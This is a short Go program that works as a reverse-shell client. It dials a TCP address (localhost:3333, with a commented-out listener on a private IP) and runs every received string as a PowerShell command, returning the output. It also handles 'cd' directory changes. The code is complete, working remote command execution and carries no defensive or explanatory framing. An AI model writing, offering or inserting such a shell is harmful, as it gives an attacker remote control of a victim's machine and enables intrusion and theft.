package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

// const (
// 	CONN_HOST = "192.168.206.97"
// 	CONN_PORT = "3333"
// 	CONN_TYPE = "tcp"
// )

// func main() {
// 	// Listen for incoming connections.
// 	l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
// 	if err != nil {
// 		fmt.Println("Error listening:", err.Error())
// 		os.Exit(1)
// 	}
// 	// Close the listener when the application closes.
// 	defer l.Close()
// 	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
// 	for {
// 		// Listen for an incoming connection.
// 		conn, err := l.Accept()
// 		if err != nil {
// 			fmt.Println("Error accepting: ", err.Error())
// 			os.Exit(1)
// 		}
// 		// Handle connections in a new goroutine.
// 		go handleRequest(conn)
// 	}
// }

// Handles incoming requests.
func main() {
	servAddr := "localhost:3333"
	tcpAddr, err := net.ResolveTCPAddr("tcp", servAddr)
	if err != nil {
		println("ResolveTCPAddr failed:", err.Error())
		os.Exit(1)
	}

	conn, err := net.DialTCP("tcp", nil, tcpAddr)
	if err != nil {
		println("Dial failed:", err.Error())
		os.Exit(1)
	}
	for {
		// Make a buffer to hold incoming data.
		buf := make([]byte, 8192)
		// Read the incoming connection into the buffer.
		_, err = conn.Read(buf)
		if err != nil {
			fmt.Println("Error reading:", err.Error())
		}
		bufString := ""
		for _, v := range buf {
			if v != 0 {
				bufString = bufString + string(v)
			}
		}
		if buf[0] == 'c' && buf[1] == 'd' {
			splits := strings.Split(bufString, " ")
			// fmt.Println(splits[1])
			dir := strings.TrimSpace(splits[1])
			err := os.Chdir(dir)
			if err != nil {
				fmt.Println("Error changing directory", err.Error())
				conn.Write([]byte("Error changing directory " + err.Error()))
			}
			wd, _ := os.Getwd()
			conn.Write([]byte("directory changed to " + wd))
		} else {
			cmd := exec.Command("powershell", bufString)
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Println(fmt.Sprint(err) + ": " + string(output))
				conn.Write([]byte("error"))
				return
			}
			fmt.Println(string(output))
			conn.Write(output)
		}
	}
	// Close the connection when you're done with it.
	// conn.Close()
}
